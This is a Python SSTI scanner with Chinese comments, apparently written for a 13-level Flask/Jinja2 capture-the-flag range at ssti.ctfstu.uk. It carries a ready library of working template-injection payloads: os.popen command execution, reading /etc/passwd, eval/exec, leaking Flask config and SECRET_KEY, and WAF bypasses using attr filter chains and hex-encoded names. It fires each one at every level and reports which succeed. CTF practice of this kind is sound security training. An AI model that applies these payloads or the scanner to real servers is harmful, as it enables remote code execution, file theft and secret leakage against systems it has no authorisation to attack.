#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSTI 漏洞扫描器
目标: http://ssti.ctfstu.uk:1685/
功能:
  - 扫描所有 13 个关卡
  - 探测指令执行、文件读取、eval 等 payload
  - 识别 WAF 规则并自动选择绕过 payload
  - 输出每个关卡的具体漏洞详情
"""

import urllib.request
import urllib.parse
import urllib.error
import ssl
import re
import json
import sys
import base64
from typing import Dict, List, Tuple, Optional

TARGET_BASE = "http://ssti.ctfstu.uk:1685"

# 禁用 SSL 验证（仅用于靶场环境）
ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE


def request(url: str, data: Optional[Dict] = None) -> Tuple[str, int]:
    """发送 HTTP 请求"""
    if data:
        data_bytes = urllib.parse.urlencode(data).encode('utf-8')
        req = urllib.request.Request(url, data=data_bytes, method='POST')
    else:
        req = urllib.request.Request(url)

    req.add_header('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36')
    try:
        resp = urllib.request.urlopen(req, context=ssl_ctx, timeout=10)
        return resp.read().decode('utf-8', errors='replace'), resp.status
    except urllib.error.HTTPError as e:
        return e.read().decode('utf-8', errors='replace'), e.code
    except Exception as e:
        return f"[ERROR] {e}", 0


def extract_response(text: str) -> str:
    """提取 POST 后返回的实际响应内容（去除 HTML 包裹）"""
    # 靶场返回格式通常是 "Hello <result>" 或纯文本
    text = text.strip()
    # 去掉 HTML 标签
    text = re.sub(r'<[^>]+>', '', text)
    text = text.strip()
    return text


# ============================================================
# Payload 库
# ============================================================

class PayloadGroup:
    """一组同类型的 payload"""
    def __init__(self, name: str, description: str):
        self.name = name
        self.description = description
        self.payloads: List[Dict] = []

    def add(self, payload: str, expected: str = "", note: str = ""):
        self.payloads.append({
            'payload': payload,
            'expected': expected,
            'note': note,
        })
        return self

    def add_with_bypass(self, payload: str, bypass_payloads: List[str],
                        expected: str = "", note: str = ""):
        """添加 payload 并附带多种绕过方式"""
        entry = {
            'payload': payload,
            'bypasses': bypass_payloads,
            'expected': expected,
            'note': note,
        }
        self.payloads.append(entry)
        return self


# 探测类 payload
PROBE_PAYLOADS = PayloadGroup("probe", "SSTI 存在性探测")
PROBE_PAYLOADS.add("{{7*7}}", "49", "基础 SSTI 测试")
PROBE_PAYLOADS.add("{{7*'7'}}", "7777777", "Jinja2 乘法溢出测试")
PROBE_PAYLOADS.add("{{config}}", "Config", "获取 Flask 配置")
PROBE_PAYLOADS.add("{{self}}", "TemplateReference", "获取模板引用对象")
PROBE_PAYLOADS.add("{{request}}", "Request", "获取请求对象")
PROBE_PAYLOADS.add("{{''.__class__}}", "str", "获取字符串的类对象")
PROBE_PAYLOADS.add("{{()|attr('__class__')}}", "tuple", "通过 attr 过滤器获取类")

# 配置泄露 payload
CONFIG_PAYLOADS = PayloadGroup("config", "Flask 配置泄露")
CONFIG_PAYLOADS.add("{{config}}", "SECRET_KEY|ENV|DEBUG", "获取 Flask 配置")
CONFIG_PAYLOADS.add("{{config.__class__.__init__.__globals__['os'].environ}}",
                     "PATH|HOME", "通过 config 获取环境变量")
CONFIG_PAYLOADS.add("{{url_for.__globals__['current_app'].config}}",
                     "SECRET_KEY", "通过 url_for 获取配置")

# 基础 RCE payload（命令执行）
RCE_PAYLOADS = PayloadGroup("rce", "命令执行 (RCE)")
RCE_PAYLOADS.add("{{''.__class__.__mro__[2].__subclasses__()}}",
                 "subprocess|Popen|os", "探测可用类（列出所有子类）")
RCE_PAYLOADS.add('{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
                 "uid=", "通过 os.popen 执行 id 命令")
RCE_PAYLOADS.add('{{config.__class__.__init__.__globals__["os"].popen("ls").read()}}',
                 "", "通过 os.popen 执行 ls 命令")
RCE_PAYLOADS.add('{{config.__class__.__init__.__globals__["os"].popen("whoami").read()}}',
                 "", "通过 os.popen 执行 whoami 命令")
RCE_PAYLOADS.add('{{config.__class__.__init__.__globals__["os"].popen("cat /etc/passwd").read()}}',
                 "root:", "读取 /etc/passwd")
RCE_PAYLOADS.add('{{config.__class__.__init__.__globals__["__builtins__"]["__import__"]("os").popen("id").read()}}',
                 "uid=", "通过 __builtins__ 导入 os 执行命令")
RCE_PAYLOADS.add('{{config.__class__.__init__.__globals__["__builtins__"]["eval"]("__import__(\'os\').popen(\'id\').read()")}}',
                 "uid=", "通过 eval 执行")

# 文件读取 payload
FILE_READ_PAYLOADS = PayloadGroup("file_read", "文件读取")
FILE_READ_PAYLOADS.add('{{config.__class__.__init__.__globals__["os"].popen("cat /etc/passwd").read()}}',
                       "root:", "读取 /etc/passwd")
FILE_READ_PAYLOADS.add('{{config.__class__.__init__.__globals__["__builtins__"]["open"]("/etc/passwd").read()}}',
                       "root:", "通过 open() 读取 /etc/passwd")
FILE_READ_PAYLOADS.add('{{get_flashed_messages.__globals__["__builtins__"]["open"]("/etc/passwd").read()}}',
                       "root:", "通过 get_flashed_messages 读取文件")
FILE_READ_PAYLOADS.add('{{lipsum.__globals__["__builtins__"]["open"]("/etc/passwd").read()}}',
                       "root:", "通过 lipsum 读取文件")
FILE_READ_PAYLOADS.add('{{url_for.__globals__["__builtins__"]["open"]("/etc/passwd").read()}}',
                       "root:", "通过 url_for 读取文件")

# Eval 执行 payload
EVAL_PAYLOADS = PayloadGroup("eval", "Eval 代码执行")
EVAL_PAYLOADS.add('{{config.__class__.__init__.__globals__["__builtins__"]["eval"]("__import__(\'os\').popen(\'id\').read()")}}',
                  "uid=", "通过 eval 执行 id")
EVAL_PAYLOADS.add('{{config.__class__.__init__.__globals__["__builtins__"]["eval"]("1+1")}}',
                  "2", "通过 eval 执行算术运算")
EVAL_PAYLOADS.add('{{config.__class__.__init__.__globals__["__builtins__"]["eval"]("__import__(\'socket\').gethostname()")}}',
                  "", "通过 eval 获取主机名")
EVAL_PAYLOADS.add('{{config.__class__.__init__.__globals__["__builtins__"]["exec"]("import os;r=os.popen(\'id\').read()")}}',
                  "uid=", "通过 exec 执行代码")

# 高级绕过 payload
BYPASS_PAYLOADS = PayloadGroup("bypass", "WAF 绕过 payload")

# 使用 |attr() 绕过
BYPASS_PAYLOADS.add('{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()}}',
                    "type|object|tuple", "使用 attr 过滤链")
BYPASS_PAYLOADS.add('{{()|attr("\\x5f\\x5fclass\\x5f\\x5f")|attr("\\x5f\\x5fmro\\x5f\\x5f")[2]|attr("\\x5f\\x5fsubclasses\\x5f\\x5f")()}}',
                    "type|object", "十六进制编码绕过")

# 使用 request 对象
BYPASS_PAYLOADS.add('{{request|attr("application")|attr("\\x5f\\x5fglobals\\x5f\\x5f")["\\x5f\\x5fbuiltins\\x5f\\x5f"]["\\x5f\\x5fimport\\x5f\\x5f"]("os").popen("id").read()}}',
                    "uid=", "通过 request 对象 RCE")

# 使用 [] 替代 .
BYPASS_PAYLOADS.add('{{""["__class__"]["__mro__"][2]["__subclasses__"]()}}',
                    "type|object", "使用 [] 替代 .")
BYPASS_PAYLOADS.add('{{config["__class__"]["__init__"]["__globals__"]["os"]["popen"]("id")["read"]()}}',
                    "uid=", "全 [] 访问 RCE")


# ============================================================
# 关卡过滤规则分析（根据实际探测结果）
# ============================================================

LEVEL_FILTERS = {
    # level: (description, filter_rules)
    1:  "无过滤 - 基础 SSTI 可达",
    2:  "WAF 严格过滤 - 几乎全部拦截",
    3:  "必须返回 'correct' - 猜测使用 {% %} 块语句",
    4:  "过滤 .__class__ - 但可用 {{config}} {{request}}",
    5:  "过滤 .__class__ - 与 4 类似",
    6:  "过滤 .__class__ + '2' - 部分 WAF",
    7:  "过滤 .__class__ + '2' + 'request'",
    8:  "过滤 .__class__ + 'request'",
    9:  "WAF 拦截 {{7*7}} 但允许 {{config}}",
    10: "config 返回 None - 可能重写了 config",
    11: "过滤 .__class__ + 'request'",
    12: "多层过滤 - {{7*7}} 拦截但 config 允许",
    13: "WAF 严格 - 过滤 _, ., \\, ', \", request, +, class, init, arg, config, app, self, [, ]",
}


def test_level_payload(level: int, payload: str) -> str:
    """向指定关卡发送 payload，返回提取后的响应"""
    url = f"{TARGET_BASE}/flasklab/level/{level}"
    raw, code = request(url, {'code': payload})
    if code != 200:
        return f"[HTTP {code}]"
    return extract_response(raw)


def is_waf_blocked(response: str, payload: str) -> bool:
    """判断响应是否表示 WAF 拦截"""
    text = response.lower()
    blocked_indicators = ['waf', 'no this level', 'wrong', 'blocked']
    for indicator in blocked_indicators:
        if indicator in text:
            return True
    # 如果响应完全为空也可能是被过滤了
    return False


def classify_response(response: str) -> str:
    """对响应进行分类"""
    r = response.strip()
    if not r:
        return "EMPTY"
    low = r.lower()
    if 'waf' in low:
        return "WAF"
    if 'no this' in low:
        return "BLOCKED"
    if 'wrong' in low:
        return "WRONG"
    if 'correct' in low:
        return "CORRECT"
    if 'error' in low or 'exception' in low or 'traceback' in low:
        return "ERROR"
    if len(r) > 10:
        return "DATA"
    return "SHORT"


# ============================================================
# 扫描执行
# ============================================================

def scan_level_detailed(level: int) -> Dict:
    """对单个关卡进行详细扫描"""
    print(f"\n{'='*60}")
    print(f"  扫描关卡 Level {level}")
    print(f"  规则: {LEVEL_FILTERS.get(level, '未知')}")
    print(f"{'='*60}")

    result = {
        'level': level,
        'filter_info': LEVEL_FILTERS.get(level, '未知'),
        'probe': {},
        'config_leak': [],
        'rce': [],
        'file_read': [],
        'eval': [],
        'bypass': [],
        'vulnerable': False,
        'has_rce': False,
        'has_file_read': False,
        'has_eval': False,
        'has_config_leak': False,
    }

    # 1. 基本探测
    print("\n[+] 执行基本探测...")
    for p in PROBE_PAYLOADS.payloads:
        payload = p['payload']
        resp = test_level_payload(level, payload)
        cls = classify_response(resp)
        result['probe'][payload[:40]] = {
            'response': resp[:100],
            'class': cls,
        }
        status = "✅" if cls in ('DATA', 'SHORT') and p['expected'] in resp else "❌"
        if p['expected'] and p['expected'] in resp and cls not in ('WAF', 'BLOCKED', 'WRONG'):
            status = "✅"
        elif cls in ('WAF', 'BLOCKED', 'WRONG'):
            status = f"⛔({cls})"
        print(f"  {status} {payload[:50]:<50s} -> {resp[:60]}")

    # 2. 配置泄露
    print("\n[+] 探测配置泄露...")
    for p in CONFIG_PAYLOADS.payloads:
        payload = p['payload']
        resp = test_level_payload(level, payload)
        cls = classify_response(resp)
        entry = {'payload': payload[:60], 'response': resp[:120], 'class': cls}
        result['config_leak'].append(entry)
        if cls == 'DATA' and not is_waf_blocked(resp, payload):
            if 'SECRET_KEY' in resp or 'ENV' in resp or 'DEBUG' in resp or 'PATH' in resp:
                status = "✅"
                result['has_config_leak'] = True
                result['vulnerable'] = True
            else:
                status = "⚠️"
        else:
            status = "❌"
        print(f"  {status} {payload[:50]:<50s} -> {resp[:60]}")

    # 3. 命令执行探测
    print("\n[+] 探测命令执行 (RCE)...")
    for p in RCE_PAYLOADS.payloads:
        payload = p['payload']
        resp = test_level_payload(level, payload)
        cls = classify_response(resp)
        entry = {'payload': payload[:60], 'response': resp[:120], 'class': cls}
        result['rce'].append(entry)
        if cls == 'DATA' and not is_waf_blocked(resp, payload):
            if p['expected'] and p['expected'] in resp:
                status = "✅"
                result['has_rce'] = True
                result['vulnerable'] = True
            elif len(resp) > 5:
                status = "⚠️ (可能有数据)"
            else:
                status = "❌"
        else:
            status = "❌"
        print(f"  {status} {payload[:50]:<50s} -> {resp[:60]}")

    # 4. 文件读取探测
    print("\n[+] 探测文件读取...")
    for p in FILE_READ_PAYLOADS.payloads:
        payload = p['payload']
        resp = test_level_payload(level, payload)
        cls = classify_response(resp)
        entry = {'payload': payload[:60], 'response': resp[:120], 'class': cls}
        result['file_read'].append(entry)
        if cls == 'DATA' and not is_waf_blocked(resp, payload):
            if p['expected'] and p['expected'] in resp:
                status = "✅"
                result['has_file_read'] = True
                result['vulnerable'] = True
            elif len(resp) > 5:
                status = "⚠️ (可能有数据)"
            else:
                status = "❌"
        else:
            status = "❌"
        print(f"  {status} {payload[:50]:<50s} -> {resp[:60]}")

    # 5. Eval 探测
    print("\n[+] 探测 Eval 代码执行...")
    for p in EVAL_PAYLOADS.payloads:
        payload = p['payload']
        resp = test_level_payload(level, payload)
        cls = classify_response(resp)
        entry = {'payload': payload[:60], 'response': resp[:120], 'class': cls}
        result['eval'].append(entry)
        if cls == 'DATA' and not is_waf_blocked(resp, payload):
            if p['expected'] and p['expected'] in resp:
                status = "✅"
                result['has_eval'] = True
                result['vulnerable'] = True
            elif len(resp) > 5:
                status = "⚠️ (可能有数据)"
            else:
                status = "❌"
        else:
            status = "❌"
        print(f"  {status} {payload[:50]:<50s} -> {resp[:60]}")

    # 6. 绕过探测
    print("\n[+] 探测 WAF 绕过...")
    for p in BYPASS_PAYLOADS.payloads:
        payload = p['payload']
        resp = test_level_payload(level, payload)
        cls = classify_response(resp)
        entry = {'payload': payload[:60], 'response': resp[:120], 'class': cls}
        result['bypass'].append(entry)
        if cls == 'DATA' and not is_waf_blocked(resp, payload):
            if p['expected'] and p['expected'] in resp:
                status = "✅"
                result['vulnerable'] = True
            elif len(resp) > 5:
                status = "⚠️"
            else:
                status = "❌"
        else:
            status = "❌"
        print(f"  {status} {payload[:50]:<50s} -> {resp[:60]}")

    return result


def generate_report(all_results: List[Dict]) -> str:
    """生成扫描报告"""
    lines = []
    lines.append("=" * 70)
    lines.append("  SSTI 漏洞扫描报告")
    lines.append(f"  目标: {TARGET_BASE}")
    lines.append(f"  扫描: 13 个关卡")
    lines.append("=" * 70)
    lines.append("")

    for r in all_results:
        lvl = r['level']
        lines.append(f"\n{'─'*60}")
        lines.append(f"  📌 Level {lvl}: {r['filter_info']}")
        lines.append(f"{'─'*60}")

        vulns = []
        if r['has_rce']:
            vulns.append("命令执行(RCE)")
        if r['has_file_read']:
            vulns.append("文件读取")
        if r['has_eval']:
            vulns.append("Eval代码执行")
        if r['has_config_leak']:
            vulns.append("配置泄露")

        if vulns:
            lines.append(f"  🚨 发现漏洞: {', '.join(vulns)}")
        else:
            lines.append(f"  ✅ 未发现明显可利用漏洞")

        # 探测结果摘要
        probe_classes = [v['class'] for v in r['probe'].values()]
        lines.append(f"  探测结果类别: {', '.join(set(probe_classes))}")

        # 显示成功的 payload
        for group_name in ['rce', 'file_read', 'eval', 'config_leak']:
            for entry in r[group_name]:
                if entry['class'] == 'DATA' and len(entry['response']) > 10:
                    lines.append(f"  ▶ {group_name}: {entry['payload'][:40]}...")
                    lines.append(f"    响应: {entry['response'][:80]}")
                    break

    # 总结表
    lines.append(f"\n{'='*70}")
    lines.append("  漏洞概览")
    lines.append(f"{'='*70}")
    lines.append(f"{'Level':>6} | {'SSTI':>6} | {'RCE':>6} | {'文件':>8} | {'Eval':>6} | {'配置泄露':>8}")
    lines.append("-" * 55)
    for r in all_results:
        s = "✅" if r['vulnerable'] else "  "
        rce =  "✅" if r['has_rce'] else "  "
        fr =   "✅" if r['has_file_read'] else "  "
        ev =   "✅" if r['has_eval'] else "  "
        cfg =  "✅" if r['has_config_leak'] else "  "
        lines.append(f"  {r['level']:>4} |  {s:>4} |  {rce:>4} |  {fr:>6} |  {ev:>4} |  {cfg:>6}")

    return '\n'.join(lines)


def save_report_to_file(report: str, filename: str = "ssti_scan_report.txt"):
    """保存报告到文件"""
    with open(f"/opt/Class01/项目/{filename}", 'w', encoding='utf-8') as f:
        f.write(report)
    print(f"\n[+] 报告已保存: /opt/Class01/项目/{filename}")


def main():
    print(f"SSTI 漏洞扫描器")
    print(f"目标: {TARGET_BASE}")
    print(f"{'='*60}")
    
    all_results = []
    
    for level in range(1, 14):
        result = scan_level_detailed(level)
        all_results.append(result)
    
    # 生成报告
    report = generate_report(all_results)
    print("\n\n" + report)
    
    save_report_to_file(report)
    
    # 输出 JSON 格式的详细结果
    json_output = {
        'target': TARGET_BASE,
        'timestamp': __import__('datetime').datetime.now().isoformat(),
        'results': all_results
    }
    with open("/opt/Class01/项目/ssti_scan_results.json", 'w', encoding='utf-8') as f:
        json.dump(json_output, f, ensure_ascii=False, indent=2)
    print(f"\n[+] JSON 结果已保存: /opt/Class01/项目/ssti_scan_results.json")


if __name__ == '__main__':
    main()
